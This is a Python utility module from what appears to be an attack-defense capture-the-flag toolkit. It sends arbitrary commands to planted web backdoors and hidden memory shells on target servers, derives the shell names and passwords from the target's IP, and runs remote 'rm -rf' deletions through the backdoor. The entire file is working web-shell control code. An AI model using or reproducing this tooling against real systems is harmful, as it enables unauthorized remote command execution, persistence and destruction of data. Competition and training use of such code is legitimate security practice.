from config import Config
from urllib import parse
import socket
from hashlib import md5
from core.shells import Shell
from core.urls import Urls

class Utils:

    def getMemShellName(url):
        hostname = parse.urlparse(url).hostname
        ip = socket.gethostbyname(hostname)    
        return "." + md5((str(ip) + "1145141919").encode("UTF-8")).hexdigest()

    def getMemShellPass(url):
        hostname = parse.urlparse(url).hostname
        ip = socket.gethostbyname(hostname)
        return md5((str(ip) + "xuxfff").encode("UTF-8")).hexdigest()
    async def exec(url,command):
        shellPath = f"{url}/{Config.backdoorPath}?{Config.backdoorPass}={command}"
        resp = await Config.session.post(
            url=shellPath,
            data = {
                Config.backdoorPass:command
            }
        )
        return await resp.text()

    async def execWithMemShell(url,command):
        shellName = Utils.getMemShellName(url)
        shellPass = Utils.getMemShellPass(url)
        shellPath = f"{url}/{Config.shellPath.strip('/var/www/html/')}/{shellName}"
        resp = await Config.session.post(
            url = shellPath,
            data = {
                shellPass:command
            }
        )
        return await resp.text()
        
    #trigger the memshell
    async def trigger(url):
        resp = await Config.session.get(
            url = url
        )
        res = await resp.text()
        if 'no_flag' in res:
            print(url)
    #del something...  such as del self-contained backdoor
    async def delete(url,file):
        await Utils.exec(url,f"system('rm -rf {file}')")